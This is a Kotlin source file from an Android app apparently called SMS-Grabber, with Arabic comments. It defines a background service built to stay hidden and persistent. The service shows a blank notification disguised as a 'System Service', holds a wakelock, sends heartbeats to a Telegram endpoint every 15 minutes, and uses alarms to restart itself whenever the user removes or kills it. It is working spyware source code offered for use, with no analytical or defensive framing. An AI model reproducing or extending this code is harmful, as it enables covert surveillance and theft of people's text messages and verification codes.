package com.smsgrabber

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import androidx.core.app.NotificationCompat

/**
 * خدمة خلفية مستمرة - تمنع الأندرويد من قتل التطبيق
 * تستخدم Foreground Service + WakeLock للاستمرارية
 */
class HideService : Service() {

    private var wakeLock: PowerManager.WakeLock? = null
    private var heartbeatThread: Thread? = null
    private var isRunning = false

    companion object {
        private const val NOTIFICATION_ID = 9999
        private const val CHANNEL_ID = "system_service_channel"
        private const val CHANNEL_NAME = "System Service"
        private const val WAKE_LOCK_TAG = "SMS-Grabber::WakeLock"
        private const val WAKE_LOCK_TIMEOUT = 10 * 60 * 1000L // 10 دقائق
        private const val HEARTBEAT_INTERVAL = 15 * 60 * 1000L // 15 دقيقة
    }

    override fun onCreate() {
        super.onCreate()
        isRunning = true
        startForegroundNotification()
        acquireWakeLock()
        startHeartbeat()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (!isRunning) {
            isRunning = true
            startForegroundNotification()
            acquireWakeLock()
            startHeartbeat()
        }
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // ==================== Foreground Notification ====================

    private fun startForegroundNotification() {
        createNotificationChannel()

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setCategory(Notification.CATEGORY_SERVICE)
            .setShowWhen(false)
            .setSound(null)
            .setVibrate(longArrayOf(0))
            .build()

        try {
            startForeground(NOTIFICATION_ID, notification)
        } catch (e: Exception) {
            // محاولة بدون foreground
            try {
                startService(Intent(this, HideService::class.java))
            } catch (_: Exception) {}
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                CHANNEL_NAME,
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "System background service"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
                setBypassDnd(true)
            }

            val manager = getSystemService(NotificationManager::class.java)
            try {
                manager.createNotificationChannel(channel)
            } catch (_: Exception) {}
        }
    }

    // ==================== WakeLock ====================

    private fun acquireWakeLock() {
        try {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                WAKE_LOCK_TAG
            )
            wakeLock?.acquire(WAKE_LOCK_TIMEOUT)
        } catch (_: Exception) {}
    }

    private fun releaseWakeLock() {
        try {
            wakeLock?.let {
                if (it.isHeld) it.release()
            }
        } catch (_: Exception) {}
        wakeLock = null
    }

    // ==================== Heartbeat ====================

    private fun startHeartbeat() {
        heartbeatThread = Thread {
            while (isRunning) {
                try {
                    Thread.sleep(HEARTBEAT_INTERVAL)
                    if (isRunning) {
                        TelegramApi.sendHeartbeat()
                    }
                } catch (_: InterruptedException) {
                    break
                } catch (_: Exception) {
                    // استمرار رغم الفشل
                }
            }
        }
        heartbeatThread?.isDaemon = true
        heartbeatThread?.start()
    }

    // ==================== Lifecycle ====================

    override fun onTaskRemoved(rootIntent: Intent?) {
        // إعادة التشغيل عند الإزالة من المهام الحديثة
        val restartIntent = Intent(applicationContext, HideService::class.java)
        restartIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)

        val pendingIntent = PendingIntent.getService(
            applicationContext,
            0,
            restartIntent,
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
        )

        val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        try {
            alarmManager.set(
                AlarmManager.RTC_WAKEUP,
                System.currentTimeMillis() + 1000,
                pendingIntent
            )
        } catch (_: Exception) {}

        super.onTaskRemoved(rootIntent)
    }

    override fun onDestroy() {
        isRunning = false
        releaseWakeLock()
        heartbeatThread?.interrupt()

        // إعادة تشغيل الخدمة
        val restartIntent = Intent(applicationContext, HideService::class.java)
        val pendingIntent = PendingIntent.getService(
            applicationContext,
            0,
            restartIntent,
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
        )

        val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        try {
            alarmManager.set(
                AlarmManager.RTC_WAKEUP,
                System.currentTimeMillis() + 1000,
                pendingIntent
            )
        } catch (_: Exception) {}

        super.onDestroy()
    }
}
